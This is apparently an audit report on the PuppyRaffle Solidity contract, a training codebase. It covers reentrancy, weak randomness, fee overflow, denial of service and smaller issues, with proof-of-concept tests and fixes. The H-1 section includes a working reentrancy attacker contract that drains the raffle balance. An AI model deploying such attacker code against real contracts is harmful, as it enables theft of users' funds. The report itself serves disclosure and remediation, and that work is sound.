### [H-1] Rentrancy Attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow [CEI] and as a result enable participants to drain the contract balance.

In the `PuppyRaffle::refund` function we are first going to make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array 

```solidity
	function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>        payable(msg.sender).sendValue(entranceFee)
@>        players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }

```

A player who has entered the raffle could have a 'fallback'/'receive' function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle until the contract left with no balance.

**Impact:** All fees paid by raffle entrants could be stolen could be stolen by the malicious participant.

**Proof Of Concept:**
1. User enters the Raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle:refund`
3. Attacker enters the raffle
4. Attacker calls  `PuppyRaffle:refund` from there attacker contract, draining the contract balance

**Proof Of Code:**
<details>
<summary>Code</summary>
Add the following code to the `PuppyRaffleTest.t.sol` file. 

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

function testReentrance() public playersEntered {
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 1e18);
    uint256 startingAttackerBalance = address(attacker).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    attacker.attack();

    uint256 endingAttackerBalance = address(attacker).balance;
    uint256 endingContractBalance = address(puppyRaffle).balance;
    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
    assertEq(endingContractBalance, 0);
}
```
Also add the Attacker Contract in Test File

```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
```

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy.

**Description:** Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together created a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or known these ahead of time to choose the winner of the raffle themselves.

*Note:* Users can front-run this function and call `refund` if they see they are not a winner

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy

**Proof of Concept:** 

There are a few attack vectors here. 

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
2. Users can mine/manipulate the `msg.sender` value to result in their address being used to generate the winner.
3. User can revert there `selectWinner` transaction if they don't like the winner or resulting puppy

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [H-3] Integer Overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In solidity versions prior to `0.8.0` integers were subject to overflows.

```solidity
uint64 myVar = type(uint64).max
//18,446,744,073,709,551,615
myVar = myVar + 1
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumalated for the fee address `feeAddress` to collect later in the `PuppyRaffle::withdrawFees`. However, if the total fees variable overflows, the `feeAddress` may not collect the correct ammount of fees, leaving fees permanently stuck in the contract.

**Proof Of Concept:**
1. We conclude the raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle
3. `totalFees` will be:
```solidity
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```
4. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`
```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
Although you could use selfdestruct to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do. At somepoint there will to much balance in the contract that the above will be impossible to hit.

<details>
<summary>Proof Of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```javascript
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff 
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows. 

2. Use a `uint256` instead of a `uint64` for `totalFees`. 

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees` 

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

We additionally want to bring your attention to another attack vector as a result of this line in a future finding.


### [M-#] TITLE Looping through Players Array to check for duplicates in `PuppyRaffle::enterRaffle` is potential DOS(Denial Of Service), incrementing the gas cost for future entrance.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is , the more checks new player will have to make. This means the gas cost for players who enter right when raffle starts will be drammatically lower than those who enters later.

Every additonal, address in the `players` array, is an additional check the loop will have to make.

This is due to the for loop in the PuppyRaffle::enterRaffle function.

```solidity
        // Check for duplicates
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas cost of the raffle will greatly increase as more players enters the raffle. Discouraging later users from entering and causing a rush at the start of a raffle to be one first entrants in the queue.

An attacker might make the `PuppyRaffle::players` array so big that no one else enters, gurranting themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: 6252039
- 2nd 100 players: 18067741

This is more than 3x as expensive for the second set of 100 players!



<details>
<summary>Proof Of Code</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
function test__Denial_Of_Service_____POC() public {
        
        vm.txGasPrice(1);

        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);

        for(uint256 i;i<playersNum;i++){
            players[i]=address(i);
        }

        //Calculating the GAS for 1st 100 players

        uint256 gasStart=gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedForFirst100Players = (gasStart-gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players: ", gasUsedForFirst100Players);

        // For the next 100 players

        address[] memory nextplayers = new address[](playersNum);

        for(uint256 i;i<playersNum;i++){
            nextplayers[i] = address(i+playersNum);
        }


        //Calculating the GAS for next 100 players

        uint256 gasStartforNext100=gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(nextplayers);
        uint256 gasEndforNext100 = gasleft();

        uint256 gasUsedForNext100Players = (gasStartforNext100-gasEndforNext100) * tx.gasprice;
        console.log("Gas cost of the Next 100 players: ", gasUsedForNext100Players);

        assert(gasUsedForNext100Players>gasUsedForFirst100Players);
        // Logs:
        //     Gas cost of the 1st 100 players: 6252039
        //     Gas cost of the 2nd 100 players: 18067741
    }
```
</details>

**Recommended Mitigation**
1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id. 

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```
# Low

### L-1: `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think that they have not entered the raffle.

**Description:** If a player is in the  `PuppyRaffle::players` array at index 0, this will return index 0, but according to the natspec, it will also returns 0 if the player is not in the array.
```solidity
/// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (uint256) {

        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```
**Impact:**  Causing a player at index 0 to incorrectly think that they have not entered the raffle and attempt to enter the raffle again, wasting gas

**Proof Of Concept:**

1. Users enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. Users thinks they have not entered correctly due to the function documentation

**Recommended Mitigation:** 
The easiest recommendation is to revert if the player in not in the array instead of returning 0. 
You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.





# GAS

### G-1: Unchanged State variables should be declared constant or immutable.

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commanImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `immutable`
- `PuppyRaffle::legendaryImageUri` should be `immutable`

### G-2: Storage Variables in loop should be cached 

Everytime you call `player.length` you read from storage, as opposed to memory which is more gas efficient

```diff
+ uint256 playerLength = players.length;
-     for (uint256 i = 0; i < players.length - 1; i++) {
+     for (uint256 i = 0; i < playerLength - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+	     for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence of predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predicatable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:* This means users could front-run this function and call `refund` if they see they are not the winner

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worhtless if it becomes a gas war as to who wins the raffle 

**Proof Of Concept:** 
1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao).  `block.difficulty` was recently replaced with prevrandao.
2. Users can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.
3. Users can revert their `selectWinner` transaction if they dont like the winner or resulting puppy.
**Recommneded Mitigation:**
Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

# Informational

### I-1: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>

### I-2: Using an outdated version of Solidity is not recommended

Please user a newer version like `0.8.18`

**Description:**
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### I-3: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 168](src/PuppyRaffle.sol#L168)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>

### I-4: `PuppyRaffle::SelectWinner` should follow CEI

Its best to keep the code clean and follow CEI (Check, Effects and Interactions)
```diff
- (bool success,) = msg.sender.call{value: prizePool}("");
-  require(success, "PuppyRaffle: Failed to send prize pool to winner");
  _safeMint(Winner, tokenId);
+ (bool success,) = msg.sender.call{value: prizePool}("");
+  require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### I-5: Use of magic numbers is discouraged

It can be confusing to see number literals in codebase, and its much more readable if the numbers are given a name

Examples:

```solidity
	uint256 prizePool = (totalAmountCollected*80)/100;
	uint256 fee = (totalAmountCollected*20)/100;
```
Instead, use like this:

```solidity
uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
uint256 public constant FEE_PERCENTAGE = 20;
uint256 public constant POOL_PRECISION = 100;
```
